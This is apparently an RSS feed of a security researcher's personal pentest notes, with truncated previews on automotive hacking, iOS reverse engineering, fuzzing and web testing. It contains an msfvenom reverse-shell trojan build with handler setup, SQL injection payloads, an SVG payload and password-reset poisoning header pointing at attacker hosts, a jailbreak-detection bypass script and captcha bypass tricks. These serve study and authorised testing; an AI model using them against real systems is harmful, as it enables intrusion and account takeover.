<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Index on </title>
    <link>http://duraki.github.io/notes/public/</link>
    <description>Recent content in Index on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>durakiconsulting (c) h. duraki</copyright>
    <lastBuildDate>Fri, 29 Apr 2022 00:00:00 +0000</lastBuildDate><atom:link href="http://duraki.github.io/notes/public/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>~ ideas</title>
      <link>http://duraki.github.io/notes/public/~-ideas/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/~-ideas/</guid>
      <description> SonicWall SMA100 Firmware 1day OPC Router DLL Hijacking, XML Attack via Licenses  </description>
    </item>
    
    <item>
      <title>API Penetration Test Checklist</title>
      <link>http://duraki.github.io/notes/public/api-penetration-test-checklist/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/api-penetration-test-checklist/</guid>
      <description>--- ## Authentication - [ ] Don&amp;#39;t use `Basic Auth`. Use standard authentication instead (e.g. [JWT](https://jwt.io/), [OAuth](https://oauth.net/)). - [ ] Don&amp;#39;t reinvent the wheel in `Authentication`, `token generation`, `password storage`. Use the standards. - [ ] Use `Max Retry` and jail features in Login. - [ ] Use encryption on all sensitive data. ### JWT (JSON Web Token) - [ ] Use a random complicated key (`JWT Secret`) to make brute forcing the token very hard.</description>
    </item>
    
    <item>
      <title>Automotive Cybersecurity Videos</title>
      <link>http://duraki.github.io/notes/public/automotive-cybersecurity-videos/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/automotive-cybersecurity-videos/</guid>
      <description>https://www.youtube.com/watch?v=xHfInsMEYdQ https://www.youtube.com/watch?v=DUNWZnhneiI https://www.youtube.com/watch?v=mz55tsLnlSc https://www.youtube.com/watch?v=k50hU6aPlG8 https://www.youtube.com/watch?v=k4JD2ZUHrXA - Cert-based auth via UDS https://www.youtube.com/watch?v=KqV5nIkGKFs - CANFD explained https://www.youtube.com/watch?v=XMVLkbw1BNE - New Standard for Ethernet on a Bus Line (10BASE-T1S) https://www.youtube.com/watch?v=WW481idfcro - Cert-based auth via Vector tool https://www.youtube.com/watch?v=pxlx3_gEiFM - Embedded Security in Automotive https://www.youtube.com/watch?v=3uU0Sl-byVc - Using ML to detect anomalyes https://www.youtube.com/watch?v=QEOWjEytb6Y - Cert-based in diagnostics (in-depth) https://www.youtube.com/watch?v=bUdxpsQXeRU - Corporate security testing in Automotive https://www.youtube.com/watch?v=DuXhz4mDYZA - From TARA to Pentest https://www.youtube.com/watch?v=7D7uNqPWrXw - Using Scapy for Car pentesting</description>
    </item>
    
    <item>
      <title>Automotive Hacking</title>
      <link>http://duraki.github.io/notes/public/automotive-hacking/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/automotive-hacking/</guid>
      <description>Link ECUs to avoid wires (weight, size, cost) Network Protocols allow ECUs to share information quickly and precisely (Ethernet &amp;amp; CANFD/CAN) Networks used between ECUs are based on Serial Communications  Serial means that items of information are sent via a single stream of communication   Speed of communication is measured in number of bits sent per second (bps) CAN (Controller Area Network) bus was developed to meet needs of up to 1 million bits per second (1Mbps) LIN (Local Interconnect Network) introduced to give a lower cost, lower speed altenative (~20 kbps) FlexRay was developed for more fault-tolerant, higher speed (10Mbps) network Ethernet (100Mbps) for videos and advanced driver assistance systems (new vehicles)  Special ECU are used called &amp;ldquo;gateways&amp;rdquo; to interconnect different network protocols (CAN + LIN, or Ethernet + FlexRay etc.</description>
    </item>
    
    <item>
      <title>CANFD Specifications</title>
      <link>http://duraki.github.io/notes/public/canfd-specifications/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/canfd-specifications/</guid>
      <description> Extended CAN frame. Can send larger payloads. A bit different structure. Using CANEdge2 for testing the CANFD frames.  </description>
    </item>
    
    <item>
      <title>Captcha Bypass Tricks</title>
      <link>http://duraki.github.io/notes/public/captcha-bypass-tricks/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/captcha-bypass-tricks/</guid>
      <description>Header Injection to bypoass Captcha
1. Response manipulation. 2. Use previously used token. 3. Use any token with same length(+1/-1). 4. Remove the param value or remove the entire parameter. 5. Change method from POST to GET(or PUT) and remove the captcha. 6. Change body to JSON or vice-versa. 7. OCR. 8. Check whether the captcha is in the source code. (Ex: 2+2) 9. Check whether the value of the captcha is in the source code.</description>
    </item>
    
    <item>
      <title>Classical API Abuse</title>
      <link>http://duraki.github.io/notes/public/classical-api-abuse/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/classical-api-abuse/</guid>
      <description>API Keys Reuse Use Keyhacks to scan for key leaks.
API Calling Convention Try to hook() on a call or initiate new calls from the handler.</description>
    </item>
    
    <item>
      <title>Cycript</title>
      <link>http://duraki.github.io/notes/public/cycript/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/cycript/</guid>
      <description>Tips and Tricks
Get pasteboard/clipboard items.
[UIPasteboard generalPasteboard].items Get UI elements dump.
[[UIApp keyWindow] recursiveDescription] Bypass Jailbreak UIAlertController via Cycript
function bypassJailbreakDetection() { try { var hook = ObjC.classes.Utils[&amp;#39;+ isJailbroken&amp;#39;]; Interceptor.attach(hook.implementation, { onLeave: function(oldValue) { _newValue = ptr(&amp;#34;0x0&amp;#34;) ; oldValue.replace(_newValue); } }); } catch(err) { console.log(&amp;#34;[-] Error: &amp;#34; + err.message); } } &amp;hellip; from Dynamic Analysis and Hacking.
Syslog Macros
# =&amp;gt; common.cy @import com.saurik.substrate.MS NSLog_ = dlsym(RTLD_DEFAULT, &amp;#34;NSLog&amp;#34;) NSLog = function() { var types = &amp;#39;v&amp;#39;, args = [], count = arguments.</description>
    </item>
    
    <item>
      <title>Decrypt IPA from AppStore</title>
      <link>http://duraki.github.io/notes/public/decrypt-ipa-from-appstore/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/decrypt-ipa-from-appstore/</guid>
      <description>Requires iproxy and frida-ios-dump. File will be generated in current directory with *.ipa extension.
# =&amp;gt; Start iproxy $ iproxy 2222 22 # =&amp;gt; Lists App from iOS processes $ cd ~/util/re/ios/frida-ios-dump $ python dump.py -l PID Name Identifier --- - App Name Here xxx.xxxxxx.xxxxxx.xx # =&amp;gt; Dump App from iOS device $ ./dump.py xxx.xxxxxx.xxxxxx.xx ... </description>
    </item>
    
    <item>
      <title>ECU Calibration</title>
      <link>http://duraki.github.io/notes/public/ecu-calibration/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/ecu-calibration/</guid>
      <description>ECU tuning is a part of Calibration Changing some values to make a vehicle faster, have better accelaration etc. This calibration process is used to fine tune all parameters before final manufacturing process Usually XCP interface is removed from final production If XCP is open, you still need to reverse the firmware to understand the ECU  How to Calibrate and Adjust  Calibration Software Vehicle networks Interface to the ECU Calibration Protocol ECU description file (*.</description>
    </item>
    
    <item>
      <title>ECU Foundations</title>
      <link>http://duraki.github.io/notes/public/ecu-foundations/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/ecu-foundations/</guid>
      <description>ECU  Electronic Control Unit the &amp;ldquo;ECU&amp;rdquo; Doing calculations or apply rules in the vehicle system  Calculation example of ECU Meassure &amp;ldquo;Speed (km/h)&amp;rdquo; ECU would &amp;ldquo;calculate&amp;rdquo;: - speed (km/h) = wheel (rpm) x 3.6   Apply a tiny part of logic  If speed is above 5km/h, then lock the doors   ECUs are wired to sensors, mothers, and other actuators One ECU can be used for different vehicles They use microcontroller (have memory/storage unlike microprocessor) Uses embedded software, via special hardware that converts electrical signal to numbers (and vice-versa), collectively IO (input/output) Uses networking hardware, via in-vehicle networks (like CANBus)  ECU Software Layers</description>
    </item>
    
    <item>
      <title>Ethernet Specifications</title>
      <link>http://duraki.github.io/notes/public/ethernet-specifications/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/ethernet-specifications/</guid>
      <description>Specifications  SomeIP, Ethernet, IP Stack New standard 10BASE-T1S 10Mbit/s Half-duplex PLCA bus cycle - only specific PHY that can send data Physical Layer Collision Avoidance (PLCA) Avoid collision of data Multiple applications on single cable  </description>
    </item>
    
    <item>
      <title>Firewall Engagements</title>
      <link>http://duraki.github.io/notes/public/firewall-engagements/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/firewall-engagements/</guid>
      <description>Reconned from the start to finish in a few sec &amp;hellip;
┌──(kali㉿kali)-[~] └─$ ping x.x.x.x PING ??? 56(84) bytes of data. 64 bytes from ???: icmp_seq=1 ttl=52 time=64.4 ms 64 bytes from ???: icmp_seq=2 ttl=52 time=62.7 ms ^C --- ??? ping statistics --- 2 packets transmitted, 2 received, 0% packet loss, time 1002ms ┌──(kali㉿kali)-[~] └─$ host x.x.x.x % nslookup &amp;gt; set type=PTR &amp;gt; x.x.x.x Server:	???	Address: ???	Non-authoritative answer: .</description>
    </item>
    
    <item>
      <title>Frida &amp; Objection Tutorial</title>
      <link>http://duraki.github.io/notes/public/frida-objection-tutorial/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/frida-objection-tutorial/</guid>
      <description>Frida Setup  iOS connected over Wi-FI, Windows/Host connected to the same Wi-Fi, Linux/Guest connected to the same Wi-Fi Establish SSH connection to the iPhone (ssh root@x.x.x.x -p $PORT) SSH Auth combo (default): root:alpine Initiate a frida-server with remote connection listener In iOS device, open the application In a new Terminal, connect to Frida server  To create a new frida-server, first remove frida autoload script and start manually:
# =&amp;gt; Unload iOS daemon $ launchctl unload -w /Library/LaunchDaemons/re.</description>
    </item>
    
    <item>
      <title>How to compromise ECU</title>
      <link>http://duraki.github.io/notes/public/how-to-compromise-ecu/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/how-to-compromise-ecu/</guid>
      <description>Five steps to compromise ECU:
 Remote access Access to in-vehicle network Bridge domain boundaries Access to target ECU Manipulate ECU or vehicle behavior  Find more info about Car Hacking on notes.</description>
    </item>
    
    <item>
      <title>How to write Notes</title>
      <link>http://duraki.github.io/notes/public/how-to-write-notes/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/how-to-write-notes/</guid>
      <description>TL;DR  Use Markdown for everything. Site generator reuses it as well. Use shortcodes Clear and consistent  Shortcodes Caption images via this shortcode
&amp;lt;span class=&amp;#34;caption-wrapper&amp;#34;&amp;gt; &amp;lt;img class=&amp;#34;caption&amp;#34; src=&amp;#34;/images/2016/thetheme/1.png&amp;#34; title=&amp;#34;Sample caption&amp;#34; alt=&amp;#34;Sample caption&amp;#34;&amp;gt; &amp;lt;span class=&amp;#34;caption-text&amp;#34;&amp;gt;Sample caption&amp;lt;/span&amp;gt; &amp;lt;/span&amp;gt; {{ &amp;lt; imgcap title=&amp;#34;Sample caption&amp;#34; src=&amp;#34;/images/2016/thetheme/1.png&amp;#34; &amp;gt; }} Insert Gist via this line
{{ &amp;lt; gist duraki 78985452 &amp;#34;filename.go&amp;#34; &amp;gt; }} Include Instagram image in the note
# =&amp;gt; https://www.instagram.com/p/BWNjjyYFxVx/ # =&amp;gt; Normal Instagram view {{ &amp;lt; instagram BWNjjyYFxVx &amp;gt; }} # =&amp;gt; Hide caption {{ &amp;lt; instagram BWNjjyYFxVx hidecaption &amp;gt; }} Include Tweet in the note</description>
    </item>
    
    <item>
      <title>iOS Reverse Engineering</title>
      <link>http://duraki.github.io/notes/public/ios-reverse-engineering/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/ios-reverse-engineering/</guid>
      <description>References
 iOS CheatSheet Decrypting apps from AppStore Reverse Engineering Tools iOS Static Analysis  Using class-dump
$ class-dump -S -s -H App -o /path/to/headers/App/  Frida &amp;amp; Objection Tutorial Pure Reverse Engineering Cycript Decrypt IPA from AppStore iOS Jailbreak Bypass iOS Static Analysis  </description>
    </item>
    
    <item>
      <title>iOS Static Analysis</title>
      <link>http://duraki.github.io/notes/public/ios-static-analysis/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/ios-static-analysis/</guid>
      <description> Find all JSON and Plist files in app bundle and see if there are any disclosures NSAllowsArbitraryLoads - Disables App Transport Security (ATS), allowing weak TLS configs CFBundleURLTypes - Custom Scheme URLs that can be exploited further (see this) AFNetworking 2.5.1 - Version and below are vulnerable to MITM if there was no SSL pinning applied  </description>
    </item>
    
    <item>
      <title>Jailbreak Bypass</title>
      <link>http://duraki.github.io/notes/public/jailbreak-bypass/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/jailbreak-bypass/</guid>
      <description>If jailbreak detection persists in iOS application, try these tricks:
 Libery Lite via Cydia, then go to settings, and then select the application Recommended Objection use ios jailbreak disable or --startup-command Frida as a standalone instrumentation Manual Patching, the old school way  </description>
    </item>
    
    <item>
      <title>Linux Notes</title>
      <link>http://duraki.github.io/notes/public/linux-notes/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/linux-notes/</guid>
      <description>Active Directory
Access Active Directory Domain Admin via Linux:
$ sudo apt-get realmd $ realm join example.ba --user username </description>
    </item>
    
    <item>
      <title>List of Topics</title>
      <link>http://duraki.github.io/notes/public/list-of-topics/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/list-of-topics/</guid>
      <description>Personal list of topics of interest. At least for me eh? :)
Automotive Cyber Security  Automotive Hacking Ethernet in Vehicles CANFD Specifications ECU Foundation ECU Compromise Vehicle Graybox Security Testing 👏  Classical Penetration Testing  Web Pentest Oneliners Web Fuzzing SQL Injection Payloads XSS Payloads Captcha Bypass Virtual Host Enumeration API Abuse Checklists  REST API Issue Library Web Issue Library   Networking  Basic Network Recon Firewall Penetration Test GSN3 Lab Environment Metasploit Framework    Reverse Engineering  OPCRouter Research WinDbg Cheatsheets iOS Reverse Engineering  Frida &amp;amp; Objection Tutorial Pure Reverse Engineering Cycript Decrypt IPA from AppStore iOS Jailbreak Bypass iOS Static Analysis    Development Misc  Windows Notes Linux Notes MacOS Notes How to write Notes Troubleshoot ~ ideas  </description>
    </item>
    
    <item>
      <title>MacOS Notes</title>
      <link>http://duraki.github.io/notes/public/macos-notes/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/macos-notes/</guid>
      <description>Check Application entitlement
# ~&amp;gt; brew install jtool # =&amp;gt; no visible entitlemens $ jtool --ent /Applications/MachOView.app /Applications/MachOView.app/Contents/MacOS//MachOView apparently does not contain any entitlements # =&amp;gt; with visible entitlements $ jtool --ent /Applications/ProtonVPN.app &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE plist PUBLIC &amp;#34;-//Apple//DTD PLIST 1.0//EN&amp;#34; &amp;#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&amp;#34;&amp;gt; &amp;lt;plist version=&amp;#34;1.0&amp;#34;&amp;gt; &amp;lt;dict&amp;gt; &amp;lt;key&amp;gt;com.apple.application-identifier&amp;lt;/key&amp;gt; &amp;lt;string&amp;gt;J6S6Q257EK.ch.protonvpn.mac&amp;lt;/string&amp;gt; &amp;lt;key&amp;gt;com.apple.developer.maps&amp;lt;/key&amp;gt; &amp;lt;true/&amp;gt; ... libSystem.B.dylib
All API rely on above library. For example, when the MachO Process starts, the above library will be loaded early in time so it can use other APIs.</description>
    </item>
    
    <item>
      <title>Metasploit Framework</title>
      <link>http://duraki.github.io/notes/public/metasploit-framework/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/metasploit-framework/</guid>
      <description>Create executable trojan
$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe LHOST=192.168.153.128 LPORT=8888 -o /root/Desktop/dolphin.exe On Attackers machine (Starting Session)
$ msfconsole ... [loaded] msf5 exploit(multi/handler) &amp;gt; use multi/handler msf5 exploit(multi/handler) &amp;gt; set payload windows/meterpreter/reverse_tcp payload =&amp;gt; windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) &amp;gt; show options Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- ----------- Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &amp;#39;&amp;#39;, seh, thread, process, none) LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Wildcard Target msf5 exploit(multi/handler) &amp;gt; set LHOST 192.</description>
    </item>
    
    <item>
      <title>Network Lab</title>
      <link>http://duraki.github.io/notes/public/network-lab/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/network-lab/</guid>
      <description>Simple Topology In GSN3, add 2 VPCS and 2 Cisco routers. Start VPCS and enter Console mode. Append IPv4 address for the interface.
# sets ipv4; netmask and gw for the vpc PC1&amp;gt; ip 192.168.0.10/24 192.168.0.1 Checking for duplicate address... PC1 : 192.168.0.10 255.255.255.0 gateway 192.168.0.1 # ... same for the 2nd vpc with different static ip # PC2&amp;gt; ip 192.168.0.11/24 192.168.0.1 Always save the configuration of the assets with save command:</description>
    </item>
    
    <item>
      <title>Network Recon</title>
      <link>http://duraki.github.io/notes/public/network-recon/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/network-recon/</guid>
      <description>External Network Engagement nmap oneliners (do-it-all) + fw evasion
$ nmap -Pn -vvv -sC --script=firewalk -p1-65535 -D RND:10 &amp;lt;target&amp;gt; basic recon
$ nslookup set type=NS x.x.x.x basic nmap
$ sudo nmap -sS 80.101.121.42 # syn scan first $ sudo nmap -O 80.101.121.42 # os detection $ sudo nmap -sV -sS 80.101.121.42 -p 8089 # service detection $ nc 80.101.121.42 8089 # try connecting via detected ports basic masscan
$ sudo masscan 80.</description>
    </item>
    
    <item>
      <title>OPCRouter Research</title>
      <link>http://duraki.github.io/notes/public/opcrouter-research/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/opcrouter-research/</guid>
      <description>OPC-Router.com Exploitation and Vulnearbility Research Supported Platforms:
 OPC-Router 4.18 (named: **OPCRouter-4.18.5005.126.exe**)  Windows Server 2016 &amp;amp; 2012 R2 Windows 10 (also IoT) &amp;amp; 8.1   OPC-Router 4.18 (named: **OPCRouter-4.18.5005.126 (Windows 7).exe**)  Windows Server 2012 R1 &amp;amp; 2008 R2 Windows 8.0 &amp;amp; 7    What is OPC OLE for Process Control (OPC) is a set of standard interfaces based upon Microsoft&amp;rsquo;s OLE/COM technology. The application of the OPC standard interface makes possible interoperability between automation/control applications, field systems/devices etc.</description>
    </item>
    
    <item>
      <title>Pure Reverse Engineering</title>
      <link>http://duraki.github.io/notes/public/pure-reverse-engineering/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/pure-reverse-engineering/</guid>
      <description>References
 Debugging iOS binaries with lldb Bypass Flutter SSL Pinning (2021) Frida Android Function Enumerator and Dumper  </description>
    </item>
    
    <item>
      <title>SQLi Payloads</title>
      <link>http://duraki.github.io/notes/public/sqli-payloads/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/sqli-payloads/</guid>
      <description>More examples might be avilable on netspi
Classical Sleep:
0&amp;#39;XOR(if(now()=sysdate(),sleep(15),0))XOR&amp;#39;Z =&amp;gt; 20.002 0&amp;#39;XOR(if(now()=sysdate(),sleep(6),0))XOR&amp;#39;Z =&amp;gt; 7.282 0&amp;#39;XOR(if(now()=sysdate(),sleep(0),0))XOR&amp;#39;Z =&amp;gt; 0.912 0&amp;#39;XOR(if(now()=sysdate(),sleep(15),0))XOR&amp;#39;Z =&amp;gt; 16.553 0&amp;#39;XOR(if(now()=sysdate(),sleep(3),0))XOR&amp;#39;Z =&amp;gt; 3.463 0&amp;#39;XOR(if(now()=sysdate(),sleep(0),0))XOR&amp;#39;Z =&amp;gt; 1.229 0&amp;#39;XOR(if(now()=sysdate(),sleep(6),0))XOR&amp;#39;Z =&amp;gt; 7.79 /api/tweets?city_id=(select(0)from(select(sleep(25)))v) ’) AND 1234=(SELECT (CASE WHEN (1234=1234) THEN 1234 ELSE (SELECT 4376 UNION SELECT 4107) END))--+ type=sharesCountTw&amp;amp;url=http%3a%2f%2finsideok.ru%2flica&amp;amp;count=-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(25))A)) SQL in useragent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36&amp;#39;;WAITFOR DELAY ‘00:00:05’;-- Blind SQL Injection:
# sleep on mysql 4.</description>
    </item>
    
    <item>
      <title>SVG Payloads</title>
      <link>http://duraki.github.io/notes/public/svg-payloads/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/svg-payloads/</guid>
      <description>&amp;lt;rect fill=�url(//attacker.com/malicious.svg#exploit)�&amp;gt; (@see: https://hackerone.com/reports/347139) </description>
    </item>
    
    <item>
      <title>Troubleshoot</title>
      <link>http://duraki.github.io/notes/public/troubleshoot/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/troubleshoot/</guid>
      <description>VirtualBox || VMWare When in Kali Linux and doing Security Assessment
 Make sure to set VMWare Kali Box to use NAT (so the VPN connection can be shared from Host, ie. MacOS)  When installing VMWare from JAMF but it doesn&amp;rsquo;t work
 Install VMWare via JAMF Store (to obtain License Key) Backup the license-fusion-120-e3-202001 from the JAMF Store VMWare Installation Application Support Manually downloading the new DMG Removing the JAMF Store VMWare installation Installing the DMG and activating via above license  Guest addition shared folder does not work</description>
    </item>
    
    <item>
      <title>Vehicle Graybox Security Testing</title>
      <link>http://duraki.github.io/notes/public/vehicle-graybox-security-testing/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/vehicle-graybox-security-testing/</guid>
      <description>Security Testing Methods  Brute-force CAN fuzzer for fuzzing application software Interface scanner, layered fuzzing DoS, Replay Messages, Tampering Man in the Middle Read and write into flash dump (extract keys, certificates, sensitive data)  Security Testing in Practice  Send out particular frame IDs using IG Generator Mount network-based attacks like DoS, MiTM, Tampering of Signals Access to debug ports like JTAG to extract + corrupt flash memory/firmware Flash dump - Look into sensitive data  Approach  Reconnaissance Start with market requirements Use customer-provided documents of the system, brochures, user manuals, published material and attacks and vulnerabilities of used components  Understand the Architecture  Analyze high-level architecture and interfaces to understand interaction between different components Use architecture model, system context, interface model, attack pathway, sequence diagram  Identify valued and protectable assets  Identify relevant assets, such is hardware, software, database, etc.</description>
    </item>
    
    <item>
      <title>vhost Enumeration</title>
      <link>http://duraki.github.io/notes/public/vhost-enumeration/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/vhost-enumeration/</guid>
      <description>vhost discovery via ffuf:
# =&amp;gt; first, find the total char lenght when the vhost does not exists $ curl -s -H &amp;#34;Host: thisdoesntexists.target.ba&amp;#34; http://target.ba | wc -c 246 # =&amp;gt; now use ffuf + filtering options to find valid vhosts $ ffuf -w ~/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H &amp;#34;Host: FUZZ.target.ba&amp;#34; -u http://target.ba -fs 246 # -fc 404,403 vhost discovery via Ruby:
$ git clone https://github.com/jobertabma/virtual-host-discovery.git $ cd virtual-host-discovery $ ruby scan.rb --ip=51.77.138.18 --host=target.</description>
    </item>
    
    <item>
      <title>Web Application Penetration Test Checklist</title>
      <link>http://duraki.github.io/notes/public/web-application-penetration-test-checklist/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/web-application-penetration-test-checklist/</guid>
      <description>[+] Sql Injection Attack [+] Hibernate Query Language Injection [+] Direct OS Code Injection [+] XML Entity Injection [+] Broken Authentication and Session Management [+] Cross-Site Scripting (XSS) [+] Insecure Direct Object References [+] Security Misconfiguration [+] Sensitive Data Exposure [+] Missing Function Level Access Control [+] Cross-Site Request Forgery (CSRF) [+] Using Components with Known Vulnerabilities [+] Unvalidated Redirects and Forwards [+] Cross Site Scripting Attacks [+] Click Jacking Attacks [+] DNS Cache Poisoning [+] Symlinking – An Insider Attack [+] Cross Site Request Forgery Attacks [+] Remote Code Execution Attacks [+] Remote File inclusion [+] Local file inclusion [+] EverCookie [+] Denial oF Service Attack [+] Cookie Eviction [+] PHPwn [+] NAT Pinning [+] XSHM [+] MitM DNS Rebinding SSL/TLS Wildcards and [+] Quick Proxy Detection [+] Improving HTTPS Side Channel Attacks [+] Side Channel Attacks in SSL [+] Turning XSS into Clickjacking [+] Bypassing CSRF protections with ClickJacking [+] HTTP Parameter Pollution [+] URL Hijacking [+] Stroke Jacking [+] Fooling B64_Encode(Payload) on WAFs And Filters [+] MySQL Stacked Queries with SQL Injection.</description>
    </item>
    
    <item>
      <title>Web Fuzzing Technqiues</title>
      <link>http://duraki.github.io/notes/public/web-fuzzing-technqiues/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/web-fuzzing-technqiues/</guid>
      <description>Use SecList seed fuzz Use FuzzDB seed fuzz  Using Gobuster || FFuF Gobuster fuzzing:
cat ~/SecLists/Discovery/Web-Content/Common-DB-Backups.txt \ ~/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt \ ~/SecLists/Discovery/Web-Content/PHP.fuzz.txt \ ~/SecLists/Discovery/Web-Content/common.txt \ /tmp/php_files_only.txt | gobuster fuzz -u \ https://www.utic.ba/FUZZ -b 404 -w - -k -t 30 ffuf fuzzing:
cat ~/SecLists/Discovery/Web-Content/CMS/symphony-267-xslt-cms.txt \ ~/SecLists/Discovery/Web-Content/CMS/symfony-315-demo.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/symfony.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/all.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/all-dirs.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/context/error.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/context/index.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/context/install.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/context/readme.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/context/root.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/context/setup.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/context/test.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/context/debug.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/context/admin.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Conf/conf.</description>
    </item>
    
    <item>
      <title>Web Penetration Testing Oneliners</title>
      <link>http://duraki.github.io/notes/public/web-penetration-testing-oneliners/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/web-penetration-testing-oneliners/</guid>
      <description>Also See      Check if vhost is a live on specific DNS or subdomain:
curl -s -H &amp;#34;Host. $SUBDOMAIN.EXAMPLE.BA&amp;#34; http://example.ba Other techniques described in vhost enumeration
Redirect URI with a Set-Cookie in GET request:
http://$EXAMPLE.BA/index.php?redirect_url=http://duraki.github.io/notes/public/%3f%0d%0a%09set-cookie:+hello=yoyoo Rate Limit Bypass
Headers: * X-Forwarded-Host: http://evil.com (Password reset poisoning) * X-Forwarded-For: 127.0.0.* (Rate Limit Bypass) Permutations: * Null byte techniques * Case sensitiveness Captcha Bypass Tricks 😂</description>
    </item>
    
    <item>
      <title>WinDbg Cheatsheets</title>
      <link>http://duraki.github.io/notes/public/windbg-cheatsheets/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://duraki.github.io/notes/public/windbg-cheatsheets/</guid>
      <description>Just personal things related to my frustration with WinDbg (:
The symbol search path tells WinDbg where to look for symbol (PDB) files. The debugger needs symbol files to obtain information about code modules (function names, variable names, and the like).
